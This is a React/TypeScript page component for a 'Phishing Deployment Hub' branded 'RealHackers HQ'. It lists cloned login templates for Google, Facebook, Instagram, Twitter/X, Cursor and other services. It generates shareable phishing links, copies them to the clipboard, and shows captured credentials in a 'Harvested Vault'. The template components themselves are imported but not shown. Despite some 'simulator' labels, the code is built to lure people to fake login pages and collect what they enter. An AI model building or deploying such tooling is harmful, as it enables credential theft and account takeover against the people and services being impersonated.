import React, { useState, useEffect } from 'react';
import { Shield, Globe, ExternalLink, Terminal, Eye, Rocket, X, Laptop, Copy, Link as LinkIcon } from 'lucide-react';
import { motion, AnimatePresence } from 'framer-motion';
import { toast } from 'sonner';
import BraveBrowserWrapper from '../components/phishing/BraveBrowserWrapper';
import { usePhishing } from '../components/PhishingContext';
import {
  GoogleLogin,
  FacebookLogin,
  InstagramLogin,
  ZaiTemplate,
  PhilosophyTemplate,
  StartpageTemplate,
  SecurityTemplate,
  TwitterTemplate,
  CursorTemplate
} from '../components/phishing/templates';

const templates = [
  { id: 'google', name: 'Google Login', type: 'SSO', risk: 'HIGH', url: 'https://accounts.google.com' },
  { id: 'facebook', name: 'Facebook Connect', type: 'SOCIAL', risk: 'MEDIUM', url: 'https://facebook.com' },
  { id: 'instagram', name: 'Instagram', type: 'SOCIAL', risk: 'HIGH', url: 'https://instagram.com' },
  { id: 'twitter', name: 'Twitter / X', type: 'SOCIAL', risk: 'MEDIUM', url: 'https://twitter.com' },
  { id: 'zai', name: 'Z.ai Platform', type: 'AI', risk: 'LOW', url: 'https://z.ai' },
  { id: 'cursor', name: 'Cursor Editor', type: 'TOOLS', risk: 'LOW', url: 'https://cursor.com' },
  { id: 'security', name: 'Google Security', type: 'SYSTEM', risk: 'HIGH', url: 'https://myaccount.google.com/security' },
  { id: 'startpage', name: 'Startpage Search', type: 'SEARCH', risk: 'LOW', url: 'https://startpage.com' },
  { id: 'philosophy', name: 'Design Philosophy', type: 'EDITORIAL', risk: 'LOW', url: 'https://designphilosophy.io' },
];

const PhishingPage: React.FC = () => {
  const [selected, setSelected] = useState(templates[0]);
  const [isLaunched, setIsLaunched] = useState(false);
  const [generatedLink, setGeneratedLink] = useState('');
  const { intel, captureIntel, clearIntel } = usePhishing();

  useEffect(() => {
    document.title = "RealHackers HQ // Phishing Module";
  }, []);

  const handleSuccess = (data: any) => {
    captureIntel(selected.id, data);
    toast.success("INTEL_CAPTURED: " + selected.name);
  };

  const generateLink = () => {
    const link = `${window.location.origin}/p/${selected.id}`;
    setGeneratedLink(link);
    toast.success("PHISHING_LINK_GENERATED");
  };

  const copyToClipboard = () => {
    navigator.clipboard.writeText(generatedLink);
    toast.info("LINK_COPIED_TO_CLIPBOARD");
  };

  const renderTemplate = () => {
    switch (selected.id) {
      case 'google': return <GoogleLogin onSuccess={handleSuccess} />;
      case 'facebook': return <FacebookLogin onSuccess={handleSuccess} />;
      case 'instagram': return <InstagramLogin onSuccess={handleSuccess} />;
      case 'twitter': return <TwitterTemplate onSuccess={handleSuccess} />;
      case 'zai': return <ZaiTemplate onSuccess={handleSuccess} />;
      case 'cursor': return <CursorTemplate onSuccess={handleSuccess} />;
      case 'security': return <SecurityTemplate onSuccess={handleSuccess} />;
      case 'startpage': return <StartpageTemplate onSuccess={handleSuccess} />;
      case 'philosophy': return <PhilosophyTemplate onSuccess={handleSuccess} />;
      default: return <div className="p-8 text-center text-neutral-500">TEMPLATE_NOT_FOUND</div>;
    }
  };

  return (
    <div className="container" style={{ maxWidth: '1400px', paddingBottom: '5rem' }}>
      <header style={{ display: 'flex', alignItems: 'center', gap: '1rem', marginBottom: '3rem' }}>
        <Shield size={32} color="var(--accent-color)" />
        <h1 style={{ letterSpacing: '4px' }}>PHISHING_DEPLOYMENT_HUB</h1>
      </header>

      <div style={{ display: 'grid', gridTemplateColumns: '350px 1fr', gap: '2rem' }}>
        {/* Sidebar: Library */}
        <div className="flex flex-col gap-6">
          <div className="card">
            <SectionTitle icon={Globe} label="TEMPLATE_LIBRARY" />
            <div style={{ display: 'flex', flexDirection: 'column', gap: '0.8rem' }}>
              {templates.map(t => (
                <div 
                  key={t.id} onClick={() => { setSelected(t); setIsLaunched(false); setGeneratedLink(''); }}
                  style={{ 
                    padding: '1rem', border: '1px solid #222', cursor: 'pointer',
                    background: selected.id === t.id ? 'rgba(231, 76, 60, 0.05)' : 'transparent',
                    borderColor: selected.id === t.id ? 'var(--accent-color)' : '#222',
                    transition: 'all 0.3s'
                  }}
                  className="hover:border-neutral-500"
                >
                  <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: '0.3rem' }}>
                    <span style={{ fontWeight: 'bold', fontSize: '0.9rem' }}>{t.name}</span>
                    <span style={{ fontSize: '0.6rem', color: t.risk === 'HIGH' ? '#f55' : '#888' }}>{t.risk}</span>
                  </div>
                  <div style={{ fontSize: '0.6rem', opacity: 0.5 }}>TYPE: {t.type}</div>
                </div>
              ))}
            </div>
          </div>

          <div className="card">
            <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '1.5rem' }}>
              <SectionTitle icon={Terminal} label="HARVESTED_VAULT" />
              <button onClick={clearIntel} style={{ fontSize: '0.5rem', opacity: 0.3, background: 'transparent', border: 'none', color: '#fff', cursor: 'pointer' }}>CLEAR_ALL</button>
            </div>
            <div className="max-h-[400px] overflow-y-auto pr-2 flex flex-col gap-2">
              {intel.length === 0 ? (
                <p className="text-[10px] text-neutral-600 italic">No data captured yet...</p>
              ) : (
                intel.map((entry) => (
                  <div key={entry.id} className="p-2 border border-neutral-800 bg-black/40 text-[10px] font-mono">
                    <div className="text-[#2ecc71] mb-1">[{new Date(entry.timestamp).toLocaleTimeString()}] {entry.platform.toUpperCase()}</div>
                    <pre className="overflow-hidden text-neutral-400" style={{ whiteSpace: 'pre-wrap', wordBreak: 'break-all' }}>
                      {JSON.stringify(entry.data, null, 2)}
                    </pre>
                  </div>
                ))
              )}
            </div>
          </div>
        </div>

        {/* Main Section: Preview/Simulator */}
        <div className="card flex flex-col" style={{ minHeight: '600px' }}>
          <div className="flex justify-between items-center mb-6">
            <SectionTitle icon={Laptop} label="DEPLOYMENT_WORKSPACE" />
            <div className="flex gap-2">
              <button 
                onClick={generateLink}
                className="btn" 
                style={{ padding: '0.5rem 1rem', border: '1px solid #333' }}
              >
                <LinkIcon size={14} /> GENERATE_LINK
              </button>
              {!isLaunched ? (
                <button 
                  onClick={() => setIsLaunched(true)}
                  className="btn" 
                  style={{ padding: '0.5rem 1rem', background: 'var(--accent-color)', borderColor: 'var(--accent-color)' }}
                >
                  <Rocket size={14} /> LAUNCH_SIMULATOR
                </button>
              ) : (
                <button 
                  onClick={() => setIsLaunched(false)}
                  className="btn" 
                  style={{ padding: '0.5rem 1rem' }}
                >
                  <X size={14} /> TERMINATE_SESSION
                </button>
              )}
            </div>
          </div>

          <AnimatePresence>
            {generatedLink && (
              <motion.div 
                initial={{ height: 0, opacity: 0 }} 
                animate={{ height: 'auto', opacity: 1 }}
                exit={{ height: 0, opacity: 0 }}
                style={{ overflow: 'hidden', marginBottom: '2rem' }}
              >
                <div style={{ padding: '1rem', background: 'rgba(46, 204, 113, 0.05)', border: '1px solid #2ecc71', borderRadius: '4px', display: 'flex', alignItems: 'center', justifyContent: 'space-between' }}>
                  <div style={{ display: 'flex', alignItems: 'center', gap: '10px' }}>
                    <div style={{ fontSize: '0.6rem', color: '#2ecc71', fontWeight: 'bold' }}>ACTIVE_UPLINK:</div>
                    <code style={{ fontSize: '0.8rem', color: '#fff' }}>{generatedLink}</code>
                  </div>
                  <div style={{ display: 'flex', gap: '10px' }}>
                    <button onClick={copyToClipboard} className="btn" style={{ padding: '0.4rem', border: 'none', background: 'transparent' }} title="Copy Link"><Copy size={16} /></button>
                    <button onClick={() => window.open(generatedLink, '_blank')} className="btn" style={{ padding: '0.4rem', border: 'none', background: 'transparent' }} title="Open in New Tab"><ExternalLink size={16} /></button>
                  </div>
                </div>
              </motion.div>
            )}
          </AnimatePresence>

          <div className="flex-1 bg-black border border-neutral-900 rounded-lg overflow-hidden relative">
            <AnimatePresence mode="wait">
              {!isLaunched ? (
                <motion.div 
                  key="preview"
                  initial={{ opacity: 0 }} 
                  animate={{ opacity: 1 }} 
                  exit={{ opacity: 0 }}
                  className="absolute inset-0 flex flex-col items-center justify-center p-8 text-center"
                >
                  <Eye size={48} className="text-neutral-800 mb-4" />
                  <h3 className="text-xl font-bold mb-2">{selected.name}</h3>
                  <p className="text-sm text-neutral-500 mb-6 max-w-md">
                    Ready to launch simulated phishing environment. All captured credentials will be stored in the Harvested Vault.
                  </p>
                  <div className="flex gap-4">
                    <span className="text-[10px] border border-neutral-800 px-2 py-1 rounded text-neutral-400">URL: {selected.url}</span>
                    <span className="text-[10px] border border-neutral-800 px-2 py-1 rounded text-neutral-400">RISK: {selected.risk}</span>
                  </div>
                </motion.div>
              ) : (
                <motion.div 
                  key="simulator"
                  initial={{ opacity: 0, scale: 0.98 }} 
                  animate={{ opacity: 1, scale: 1 }} 
                  exit={{ opacity: 0, scale: 1.02 }}
                  className="absolute inset-0"
                >
                  <BraveBrowserWrapper 
                    activeTabUrl={selected.url}
                    tabs={[
                      { id: selected.id, title: selected.name, url: selected.url, icon: <Globe size={12} />, active: true }
                    ]}
                  >
                    {renderTemplate()}
                  </BraveBrowserWrapper>
                </motion.div>
              )}
            </AnimatePresence>
          </div>
        </div>
      </div>
    </div>
  );
};

const SectionTitle: React.FC<{ icon: any, label: string }> = ({ icon: Icon, label }) => (
  <div style={{ display: 'flex', alignItems: 'center', gap: '0.6rem', marginBottom: '1.5rem', opacity: 0.4 }}>
    <Icon size={16} />
    <span style={{ fontSize: '0.7rem', fontWeight: 'bold', letterSpacing: '2px' }}>{label}</span>
  </div>
);

export default PhishingPage;
